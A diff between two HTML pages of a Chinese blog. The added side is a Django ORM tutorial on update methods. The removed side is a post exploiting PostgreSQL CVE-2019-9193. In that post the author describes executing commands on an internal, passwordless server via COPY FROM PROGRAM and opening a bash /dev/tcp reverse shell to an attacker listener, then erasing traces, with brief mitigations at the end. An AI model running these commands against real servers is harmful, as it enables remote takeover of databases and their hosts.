@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="Tachiu Lam">
   <meta name="keywords" content="">
-  <title>PostgreSQL任意命令执行漏洞利用（CVE-2019-9193) - Tachiu Lam</title>
+  <title>Django model篇（一）：update用法介绍 - Tachiu Lam</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
@@ -119,7 +119,7 @@
 </nav>
 
     <div class="view intro-2" id="background" parallax=true
-         style="background: url('/img/pg.png') no-repeat center center;
+         style="background: url('/img/django.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -132,8 +132,8 @@
               
                 <div class="mt-3 post-meta">
                   <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-                  <time datetime="2020-05-25 23:12">
-                    2020年5月25日 晚上
+                  <time datetime="2020-06-12 00:21">
+                    2020年6月12日 凌晨
                   </time>
                 </div>
               
@@ -143,7 +143,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    511 字
+                    1.2k 字
                   </span>
                 
 
@@ -153,7 +153,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    6
+                    15
                      分钟
                   </span>
                 
@@ -183,42 +183,143 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2020年5月28日 晚上
+                  本文最后更新于：2020年6月12日 凌晨
                 
               </p>
             
             <article class="markdown-body">
-              <p>最近没事曰曰内网，偶然发现了一个使用空密码的pg（是的，连爆破都省了）。用navicat连上去看了下几个库都是一些业务测试数据，没什么好收集；不死心，google了一下发现有个比较新的CVE好像可以操作一下~</p>
-<h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><p>最近，安全研究人员披露了PostgreSQL实例代码执行漏洞（CVE-2019-9193）的漏洞细节。具有数据库 服务器 文件读取权限的攻击者可以利用此漏洞执行任意系统命令。</p>
-<p>从9.3版本开始，Postgres新增了一个COPY TO/FROM PROGRAM功能，允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令。</p>
-<p>**受影响的版本（貌似更新版本无解）</p>
-<p>PostgreSQL&gt; = 9.3**</p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="pg数据库连接"><a href="#pg数据库连接" class="headerlink" title="pg数据库连接"></a>pg数据库连接</h5><pre><code class="hljs plain"># 连接postgressql，虽然是内网ip但还是打一下码吧
-psql -U postgres -h 172.xx.xxx.xx</code></pre>
-<p><img src="/img/pg_res1.png" srcset="/img/loading.gif" alt="image"></p>
-<h5 id="开始攻击（直接套用网上POC）"><a href="#开始攻击（直接套用网上POC）" class="headerlink" title="开始攻击（直接套用网上POC）"></a>开始攻击（直接套用网上POC）</h5><pre><code class="hljs plain"># 删除并创建用于保存系统命令执行结果的表 
-DROP TABLE IF EXISTS cmd_exec;
-CREATE TABLE cmd_exec(cmd_output text);
+              <h3 id="model-update常用方法"><a href="#model-update常用方法" class="headerlink" title="model update常用方法"></a>model update常用方法</h3><p>方法一：</p>
+<pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(username=<span class="hljs-string">'tachiulam'</span>,is_active=<span class="hljs-literal">True</span>)</code></pre>
+<p>方法二：</p>
+<pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)
+_t.username=<span class="hljs-string">'tachiulam'</span>
+_t.is_active=<span class="hljs-literal">True</span>
+_t.save()</code></pre>
+<p>方法一适合更新一批数据，类似于mysql语句update user set username=’tachiulam’ where id = 1</p>
+<p>方法二适合更新一条数据，也只能更新一条数据，当只有一条数据更新时推荐使用此方法，另外此方法还有一个好处，我们接着往下看</p>
+<h3 id="具有auto-now属性字段的更新"><a href="#具有auto-now属性字段的更新" class="headerlink" title="具有auto_now属性字段的更新"></a>具有auto_now属性字段的更新</h3><p>我们通常会给表添加三个默认字段</p>
+<ul>
+<li><p>自增ID，这个django已经默认加了，就像上边的建表语句，虽然只写了username和is_active两个字段，但表建好后也会有一个默认的自增id字段</p>
+</li>
+<li><p>创建时间，用来标识这条记录的创建时间，具有auto_now_add属性，创建记录时会自动填充当前时间到此字段</p>
+</li>
+<li><p>修改时间，用来标识这条记录最后一次的修改时间，具有auto_now属性，当记录发生变化时填充当前时间到此字段<br>就像下边这样的表结构</p>
+</li>
+</ul>
+<pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>
+    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'创建时间'</span>)
+    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'更新时间'</span>)
+    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'用户名'</span>)
+    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'激活状态'</span>)</code></pre>
+<p>当表有字段具有auto_now属性且你希望他能自动更新时，必须使用上边方法二的更新，不然auto_now字段不会更新，也就是：</p>
+<pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)
+_t.username=<span class="hljs-string">'tachiulam'</span>
+_t.is_active=<span class="hljs-literal">True</span>
+_t.save()</code></pre>
+<h3 id="json-dict类型数据更新字段"><a href="#json-dict类型数据更新字段" class="headerlink" title="json/dict类型数据更新字段"></a>json/dict类型数据更新字段</h3><p>目前主流的web开放方式都讲究前后端分离，分离之后前后端交互的数据格式大都用通用的json型，那么如何用最少的代码方便的更新json格式数据到数据库呢？同样可以使用如下两种方法：</p>
+<p>方法一：</p>
+<pre><code class="hljs python">data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'is_active'</span>:<span class="hljs-string">'0'</span>&#125;
+User.objects.filter(id=<span class="hljs-number">1</span>).update(**data)</code></pre>
+<ul>
+<li><p>同样这种方法不能自动更新具有auto_now属性字段的值</p>
+</li>
+<li><p>通常我们再变量前加一个星号(*)表示这个变量是元组/列表，加两个星号表示这个参数是字典</p>
+</li>
+</ul>
+<p>方法二：</p>
+<pre><code class="hljs python">data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'is_active'</span>:<span class="hljs-string">'0'</span>&#125;
+_t = User.objects.get(id=<span class="hljs-number">1</span>)
+_t.__dict__.update(**data)
+_t.save()</code></pre>
 
-# 命令执行测试，多试几条
-COPY cmd_exec FROM PROGRAM &#39;id&#39;;
-COPY cmd_exec FROM PROGRAM &#39;whoami&#39;;
+<ul>
+<li><p>方法二和方法一同样无法自动更新auto_now字段的值</p>
+</li>
+<li><p>注意这里使用到了一个dict方法</p>
+</li>
+</ul>
+<p>方法三：</p>
+<pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)
+_t.role=Role.objects.get(id=<span class="hljs-number">3</span>)
+_t.save()</code></pre>
+<h3 id="ForeignKey字段更新"><a href="#ForeignKey字段更新" class="headerlink" title="ForeignKey字段更新"></a>ForeignKey字段更新</h3><p>假如我们的表中有Foreignkey外键时，该如何更新呢？</p>
+<pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>
+    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'创建时间'</span>)
+    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'更新时间'</span>)
+    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'用户名'</span>)
+    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'激活状态'</span>)
+    role = models.ForeignKey(Role, on_delete=models.CASCADE, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'角色'</span>)</code></pre>
+<p>方法一：</p>
+<pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(role=<span class="hljs-number">2</span>)</code></pre>
 
-# 查看结果
-SELECT * FROM cmd_exec;</code></pre>
-<p><img src="/img/pg_res2.png" srcset="/img/loading.gif" alt="image"><br>我的🐎，还是个root用户，，都不用提权了（这安全意识阿。。。）</p>
-<h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><p>虽然都可以执行系统命令了，拿不拿shell无所谓，但拿了还是要方便一些；</p>
-<pre><code class="hljs plain"># attack机器上开启监听
-nc -lvnp 8888
+<ul>
+<li><p>最简单的方法，直接让给role字段设置为一个id即可</p>
+</li>
+<li><p>当然也可以用dict作为参数更新：</p>
+<pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role'</span>:<span class="hljs-number">3</span>&#125;)</code></pre>
 
-# 利用pg执行远程连接命令
-COPY cmd_exec FROM PROGRAM &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8888 0&gt;&amp;1&#39;;</code></pre>
-<p>attack机器已经返回shell连接了~<br><img src="/img/pg_res3.png" srcset="/img/loading.gif" alt="image"></p>
-<p>记录一下，顺便清除记录收工了。</p>
-<h4 id="解决方案建议"><a href="#解决方案建议" class="headerlink" title="解决方案建议"></a>解决方案建议</h4><p>1、pg_read_server_files，pg_write_server_files和pg_execute_server_program角色涉及读取和写入具有大权限的数据库服务器文件。将此角色权限分配给数据库用户时，应慎重考虑。</p>
-<p>2、使用强密码！！！</p>
-<p>3、进行网络隔离，只允许需要的IP连接；</p>
-<p><a href="https://zhuanlan.zhihu.com/p/143443516" target="_blank" rel="noopener">🔗知乎链接</a></p>
+</li>
+</ul>
+<p>方法二：</p>
+<pre><code class="hljs python">_role = Role.objects.get(id=<span class="hljs-number">2</span>)
+User.objects.filter(id=<span class="hljs-number">1</span>).update(role=_role)</code></pre>
+<ul>
+<li><p>也可以赋值一个实例给role</p>
+</li>
+<li><p>当然也可以用dict作为参数更新：</p>
+</li>
+</ul>
+<pre><code class="hljs python">_role = Role.objects.get(id=<span class="hljs-number">1</span>)
+User.objects.filter(id=<span class="hljs-number">1</span>).update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role'</span>:_role&#125;)</code></pre>
+<p>方法三：</p>
+<pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)
+_t.role=Role.objects.get(id=<span class="hljs-number">3</span>)
+_t.save()</code></pre>
+<ul>
+<li><p>注意：这里的role必须赋值为一个对象，不能写id，不然会报错”User.role” must be a “Role” instance</p>
+</li>
+<li><p>当使用dict作为参数更新时又有一点不同，如下代码：</p>
+</li>
+</ul>
+<pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)
+_t.__dict__.update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role_id'</span>:<span class="hljs-number">2</span>&#125;)
+_t.save()</code></pre>
+<ul>
+<li><p>Foreignkey外键必须加上<code>_id</code>，例如：{‘role_id’:3}</p>
+</li>
+<li><p>role_id后边必须跟一个id（int或str类型都可），不能跟role实例</p>
+</li>
+</ul>
+<h3 id="ManyToManyField字段更新"><a href="#ManyToManyField字段更新" class="headerlink" title="ManyToManyField字段更新"></a>ManyToManyField字段更新</h3><p>假如我们的表中有ManyToManyField字段时更新又有什么影响呢？</p>
+<pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>
+    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'创建时间'</span>)
+    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'更新时间'</span>)
+    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'用户名'</span>)
+    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'激活状态'</span>)
+    role = models.ForeignKey(Role, on_delete=models.CASCADE, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'角色'</span>)
+    groups = models.ManyToManyField(Group, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'组'</span>)</code></pre>
+<p>m2m更新：m2m字段没有直接更新的方法，只能通过清空再添加的方法更新了</p>
+<pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)
+_t.groups.clear()
+_t.groups.add(*[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>])
+_t.save()</code></pre>
+<ul>
+<li><p>add()：m2m字段添加一个值，当有多个值的时候可用列表，参照上边例子</p>
+</li>
+<li><p>_t.groups.add(2)</p>
+</li>
+<li><p>_t.groups.add(Group.objects.get(id=2))</p>
+</li>
+<li><p>remove()：m2m字段移除一个值，，当有多个值的时候可用列表，参照上边例子</p>
+</li>
+<li><p>_t.groups.remove(2)</p>
+</li>
+<li><p>_t.groups.remove(Group.objects.get(id=2))</p>
+</li>
+<li><p>clear()：清空m2m字段的值</p>
+</li>
+</ul>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MDY1MzcyOQ==&mid=2247483702&idx=1&sn=720529d0cd15ecf11e07392d5da33a47&scene=21#wechat_redirect" target="_blank" rel="noopener">🔗原文链接</a></p>
 
             </article>
             <hr>
@@ -228,7 +329,9 @@ COPY cmd_exec FROM PROGRAM &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                      <a class="hover-with-bg" href="/categories/Django/">Django</a>
+                    
+                      <a class="hover-with-bg" href="/categories/Django/model/">model</a>
                     
                   </div>
                 
@@ -236,7 +339,7 @@ COPY cmd_exec FROM PROGRAM &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E5%AE%89%E5%85%A8/">安全</a>
+                      <a class="hover-with-bg" href="/tags/Django/">Django</a>
                     
                   </div>
                 
@@ -249,18 +352,12 @@ COPY cmd_exec FROM PROGRAM &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2020/06/12/Django%20model%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Aupdate%E7%94%A8%E6%B3%95%E4%BB%8B%E7%BB%8D/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Django model篇（一）：update用法介绍</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
-                        <span class="hidden-mobile">Redis未授权访问漏洞利用</span>
+                      <a href="/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/">
+                        <span class="hidden-mobile">PostgreSQL任意命令执行漏洞利用（CVE-2019-9193)</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -458,7 +555,7 @@ COPY cmd_exec FROM PROGRAM &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "PostgreSQL任意命令执行漏洞利用（CVE-2019-9193)&nbsp;",
+        "Django model篇（一）：update用法介绍&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
